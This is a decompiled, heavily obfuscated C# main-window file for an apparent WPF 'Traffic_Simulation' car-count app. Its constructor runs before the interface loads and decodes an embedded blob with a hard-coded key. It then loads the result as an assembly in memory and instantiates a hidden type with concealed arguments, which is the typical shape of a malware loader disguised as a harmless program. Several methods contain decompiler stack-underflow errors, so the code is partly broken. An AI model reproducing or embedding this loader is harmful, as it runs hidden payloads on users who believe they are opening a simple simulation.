using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace Traffic_Simulation;

public class MainWindow : Window, IComponentConnector
{
	internal TextBox box;

	private bool _contentLoaded;

	private Assembly Asemia(object ji)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -701923184;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF82A3B7Bu) % 4u)
				{
				case 3u:
					result = MainWindow.smethod_0((byte[])ji);
					num = ((int)num2 * -1744909567) ^ -912440551;
					continue;
				case 1u:
					num = (int)((num2 * 1097024765) ^ 0x7A2D0F64);
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public MainWindow()
	{
		Assembly assembly_ = Asemia(Points.Chi(Led.Red1, MainWindow.smethod_2(MainWindow.smethod_1(), "A4DC95C840QFUTHC44S847")));
		Type type_ = MainWindow.smethod_3(assembly_)[1];
		string[] array = MainWindow.smethod_4(Points.Bookmarks, new char[1] { '~' });
		object[] object_ = new object[3]
		{
			array[0],
			array[1],
			"Traffic_Simulation"
		};
		MainWindow.smethod_5(type_, object_);
		InitializeComponent();
	}

	private void box_PreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
	{
		while (true)
		{
			int num = 271999917;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x548DE57Au) % 6u)
				{
				case 4u:
					MainWindow.smethod_8(box, "");
					num = ((int)num2 * -1179093510) ^ 0x295359D1;
					continue;
				case 3u:
					num = ((int)num2 * -1913746427) ^ 0x3C135057;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (MainWindow.smethod_7(MainWindow.smethod_6(box), "Enter number"))
					{
						num3 = 314405777;
						num4 = 314405777;
					}
					else
					{
						num3 = 1240384848;
						num4 = 1240384848;
					}
					num = num3 ^ ((int)num2 * -2075900467);
					continue;
				}
				case 0u:
					num = (int)((num2 * 440203829) ^ 0x336D57B9);
					continue;
				default:
					return;
				case 2u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Start(object sender, RoutedEventArgs e)
	{
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Expected I4, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Expected I4, but got Unknown
		//IL_019f: Incompatible stack heights: 0 vs 1
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Incompatible stack heights: 0 vs 1
		//IL_01c1: Incompatible stack heights: 0 vs 1
		try
		{
			Simulation window_ = default(Simulation);
			while (true)
			{
				int num = 688638269;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x156CB9E0u) % 13u)
					{
					case 12u:
					{
						int num3;
						int num4;
						if (int.Parse(MainWindow.smethod_6(box)) <= 0)
						{
							num3 = -180326950;
							num4 = -180326950;
						}
						else
						{
							num3 = -1922408882;
							num4 = -1922408882;
						}
						num = num3 ^ ((int)num2 * -971011439);
						continue;
					}
					case 11u:
						MainWindow.smethod_8(box, "Enter Number");
						num = 1892235045;
						continue;
					case 10u:
						window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
						num = ((int)num2 * -1320376064) ^ 0x10ADCC10;
						continue;
					case 9u:
						num = ((int)num2 * -1780652940) ^ 0x248C5A4D;
						continue;
					case 8u:
						num = (int)((num2 * 955963913) ^ 0x6E2DF2E7);
						continue;
					case 7u:
						num = ((int)num2 * -1678421729) ^ 0x142BB6B1;
						continue;
					case 6u:
						MainWindow.smethod_9((Window)(object)window_);
						num = (int)((num2 * 377057819) ^ 0x1515DCF4);
						continue;
					case 4u:
						MainWindow.smethod_11("Count of the car has to greater than zero!");
						num = (int)((num2 * 2104442179) ^ 0x55741041);
						continue;
					case 3u:
						MainWindow.smethod_10((Window)(object)this);
						num = (int)(num2 * 394979735) ^ -1633826724;
						continue;
					case 2u:
						num = (int)(num2 * 443512847) ^ -2082072061;
						continue;
					case 0u:
						num = (int)((num2 * 963546222) ^ 0x3D932FA9);
						continue;
					default:
						return;
					case 5u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			while (true)
			{
				_ = 1878792479;
				while (true)
				{
					_003F val = /*Error near IL_0167: Stack underflow*/^ 0x156CB9E0;
					uint num2 = (uint)(int)val;
					switch (val % 4)
					{
					default:
						return;
					case 3:
						MainWindow.smethod_8(box, "Enter Number");
						_ = ((int)num2 * -1614202857) ^ 0x4DFB358D;
						continue;
					case 0:
						MainWindow.smethod_11(MainWindow.smethod_12(exception_));
						_ = (num2 * 2122790070) ^ 0xA711F84Du;
						continue;
					case 2:
						break;
					case 1:
						return;
					}
					break;
				}
			}
		}
	}

	private void Window_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f5: Expected I4, but got Unknown
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Expected I4, but got Unknown
		//IL_0218: Incompatible stack heights: 0 vs 1
		//IL_021f: Incompatible stack heights: 0 vs 1
		Simulation window_ = default(Simulation);
		while (true)
		{
			int num = 1668444960;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x25592FFEu) % 3u)
				{
				case 1u:
					if ((int)MainWindow.smethod_13(e) == 6)
					{
						goto IL_0011;
					}
					return;
				case 2u:
					break;
				default:
					try
					{
						while (true)
						{
							int num3 = 687360253;
							while (true)
							{
								switch ((num2 = (uint)num3 ^ 0x25592FFEu) % 14u)
								{
								case 13u:
									num3 = (int)((num2 * 653926003) ^ 0x22328E2A);
									continue;
								case 12u:
									num3 = 882778970;
									continue;
								case 11u:
									num3 = (int)((num2 * 1035929073) ^ 0x3E5F78A);
									continue;
								case 10u:
									num3 = (int)((num2 * 2059111) ^ 0xFF1F0B6);
									continue;
								case 9u:
									MainWindow.smethod_11("Count of the car has to greater than zero!");
									num3 = ((int)num2 * -2050001452) ^ -1372289347;
									continue;
								case 7u:
									num3 = (int)(num2 * 16219626) ^ -1169707175;
									continue;
								case 6u:
									MainWindow.smethod_10((Window)(object)this);
									num3 = ((int)num2 * -336578424) ^ 0xA658A93;
									continue;
								case 5u:
									window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
									num3 = ((int)num2 * -1858515429) ^ 0x46DF3109;
									continue;
								case 4u:
									MainWindow.smethod_8(box, "Enter Number");
									num3 = (int)((num2 * 361323956) ^ 0x11346E83);
									continue;
								case 2u:
									num3 = ((int)num2 * -793521274) ^ -619593059;
									continue;
								case 1u:
								{
									int num4;
									int num5;
									if (int.Parse(MainWindow.smethod_6(box)) > 0)
									{
										num4 = -2114260216;
										num5 = -2114260216;
									}
									else
									{
										num4 = -1945108724;
										num5 = -1945108724;
									}
									num3 = num4 ^ ((int)num2 * -2029857928);
									continue;
								}
								case 0u:
									MainWindow.smethod_9((Window)(object)window_);
									num3 = (int)(num2 * 1698839399) ^ -1775641956;
									continue;
								default:
									return;
								case 8u:
									break;
								case 3u:
									return;
								}
								break;
							}
						}
					}
					catch (Exception exception_)
					{
						MainWindow.smethod_8(box, "Enter Number");
						MainWindow.smethod_11(MainWindow.smethod_12(exception_));
						while (true)
						{
							_ = 1287521467;
							while (true)
							{
								_003F val = /*Error near IL_01f2: Stack underflow*/^ 0x25592FFE;
								num2 = (uint)(int)val;
								switch (val % 3)
								{
								default:
									return;
								case 1:
									_ = (num2 * 1886728439) ^ 0x298C4EF4;
									continue;
								case 0:
									break;
								case 2:
									return;
								}
								break;
							}
						}
					}
				}
				break;
				IL_0011:
				num = (int)((num2 * 2080632796) ^ 0x73C290D2);
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		bool contentLoaded = _contentLoaded;
		while (true)
		{
			int num = 315647187;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x74594745u) % 7u)
				{
				case 6u:
					num = ((int)num2 * -1842444972) ^ -70044842;
					continue;
				case 4u:
				{
					_contentLoaded = true;
					Uri uri_ = MainWindow.smethod_14("/tusP;component/mainwindow.xaml", UriKind.Relative);
					MainWindow.smethod_15((object)this, uri_);
					num = 595749048;
					continue;
				}
				case 2u:
					num = (int)((num2 * 263343187) ^ 0x6F3DB65F);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!contentLoaded)
					{
						num3 = -2008059034;
						num4 = -2008059034;
					}
					else
					{
						num3 = -287297942;
						num4 = -287297942;
					}
					num = num3 ^ ((int)num2 * -2109244495);
					continue;
				}
				case 0u:
					num = (int)((num2 * 845732540) ^ 0x6AD7EFCE);
					continue;
				default:
					return;
				case 3u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0041: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = -1262457477;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x99CC8287u) % 16u)
				{
				case 15u:
					num = ((int)num2 * -71164170) ^ 0x3A24C307;
					continue;
				case 14u:
					num = ((int)num2 * -454676998) ^ 0x6CD8BFE4;
					continue;
				case 13u:
					MainWindow.smethod_18((ButtonBase)(Button)target, new RoutedEventHandler(Start));
					num = -787930574;
					continue;
				case 12u:
					num3 = connectionId;
					num = (int)(num2 * 864223490) ^ -1289139538;
					continue;
				case 11u:
					MainWindow.smethod_17((UIElement)(object)box, new MouseButtonEventHandler(box_PreviewMouseLeftButtonUp));
					num = ((int)num2 * -767869177) ^ 0x3EBBA984;
					continue;
				case 9u:
					switch (num4)
					{
					case 3:
						break;
					default:
						goto IL_009c;
					case 1:
						goto IL_00ae;
					case 2:
						goto IL_00cc;
					}
					goto case 13u;
				case 7u:
					goto IL_00ae;
				case 4u:
					goto IL_00cc;
				case 8u:
					num = ((int)num2 * -951934523) ^ 0x54843E3F;
					continue;
				case 5u:
					num = ((int)num2 * -1341672835) ^ 0x6EBD624C;
					continue;
				case 3u:
					num = ((int)num2 * -421962176) ^ -1940522523;
					continue;
				case 2u:
					num = (int)((num2 * 112665829) ^ 0x26CCF9C7);
					continue;
				case 1u:
					num4 = num3;
					num = (int)(num2 * 181776508) ^ -675987758;
					continue;
				case 0u:
					_contentLoaded = true;
					num = -1450364883;
					continue;
				default:
					return;
				case 6u:
					break;
				case 10u:
					return;
					IL_00cc:
					box = (TextBox)target;
					num = -132560580;
					continue;
					IL_00ae:
					MainWindow.smethod_16((UIElement)(object)(MainWindow)target, new KeyEventHandler(Window_KeyDown));
					num = -1860434380;
					continue;
					IL_009c:
					num = ((int)num2 * -778719360) ^ 0x32501D4F;
					continue;
				}
				break;
			}
		}
	}

	static Assembly smethod_0(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static Encoding smethod_1()
	{
		return Encoding.Default;
	}

	static byte[] smethod_2(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static Type[] smethod_3(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static string[] smethod_4(string string_0, char[] char_0)
	{
		return string_0.Split(char_0);
	}

	static object smethod_5(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static string smethod_6(TextBox textBox_0)
	{
		return textBox_0.get_Text();
	}

	static bool smethod_7(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void smethod_8(TextBox textBox_0, string string_0)
	{
		textBox_0.set_Text(string_0);
	}

	static void smethod_9(Window window_0)
	{
		window_0.Show();
	}

	static void smethod_10(Window window_0)
	{
		window_0.Close();
	}

	static MessageBoxResult smethod_11(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0);
	}

	static string smethod_12(Exception exception_0)
	{
		return exception_0.Message;
	}

	static Key smethod_13(KeyEventArgs keyEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return keyEventArgs_0.get_Key();
	}

	static Uri smethod_14(string string_0, UriKind uriKind_0)
	{
		return new Uri(string_0, uriKind_0);
	}

	static void smethod_15(object object_0, Uri uri_0)
	{
		Application.LoadComponent(object_0, uri_0);
	}

	static void smethod_16(UIElement uielement_0, KeyEventHandler keyEventHandler_0)
	{
		uielement_0.add_KeyDown(keyEventHandler_0);
	}

	static void smethod_17(UIElement uielement_0, MouseButtonEventHandler mouseButtonEventHandler_0)
	{
		uielement_0.add_PreviewMouseLeftButtonUp(mouseButtonEventHandler_0);
	}

	static void smethod_18(ButtonBase buttonBase_0, RoutedEventHandler routedEventHandler_0)
	{
		buttonBase_0.add_Click(routedEventHandler_0);
	}
}
